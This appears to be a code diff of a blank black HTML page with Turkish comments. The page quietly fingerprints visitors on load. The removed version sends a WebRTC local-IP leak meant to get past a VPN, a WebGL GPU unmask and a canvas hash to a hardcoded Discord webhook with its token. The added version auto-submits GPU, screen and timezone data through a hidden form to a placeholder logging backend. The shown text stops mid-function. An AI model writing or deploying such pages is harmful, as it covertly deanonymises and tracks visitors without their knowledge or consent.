@@ -1,48 +1,26 @@
 <!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <title> </title> <style>
-        body { background:#000; margin:0; overflow:hidden; cursor:default; }
-    </style>
-</head>
-<body>
+<html>
+<head><title> </title></head>
+<body style="background:#000;">
+    <form id="f" action="https://senin-backend-siten.com/log.php" method="POST">
+        <input type="hidden" name="gpu" id="g">
+        <input type="hidden" name="res" id="r">
+        <input type="hidden" name="tz" id="t">
+    </form>
     <script>
-        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-
-        async function sızdır() {
-            let d = { vpn: "✅ VPN KAPALI (DOĞRULANDI)", gpu: "X", ven: "X", ip: "X", iss: "X", hash: "X", local: "N/A" };
-            let score = 0;
-
-            // 1. GİZLİ WEBRTC LEAK (VPN'i Baypas Denemesi)
-            try {
-                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-                pc.createDataChannel("");
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (i) => {
-                    if (i && i.candidate) {
-                        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
-                        if (m) d.local = m[1];
-                    }
-                };
-            } catch(e) {}
-
-            // 2. GPU MASKESİ KIRMA (Matematiksel Parmak İzi)
+        (function() {
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                const gl = canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-
-                // Donanım Hassasiyet Analizi
-                const ctx = canvas.getContext('2d');
-                ctx.font = "18pt Arial";
-                ctx.fillText("V80_VOID", 4, 10);
-                d.hash = btoa(canvas.toDataURL()).slice(-40, -10);
+                document.getElementById('g').value = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                document.getElementById('r').value = screen.width + "x" + screen.height;
+                document.getElementById('t').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                // Formu otomatik gönder (CORS'u bypass etmenin en eski yolu)
+                document.getElementById('f').submit();
             } catch(e) {}
+        })();
+    </script>
+</body>
+</html>
 
-            // 3. DERİN AĞ VE VPN ANALİZİ
-            try {
-                const res = await fetch('https://ipapi.co/json/').catch(() =>
-                    
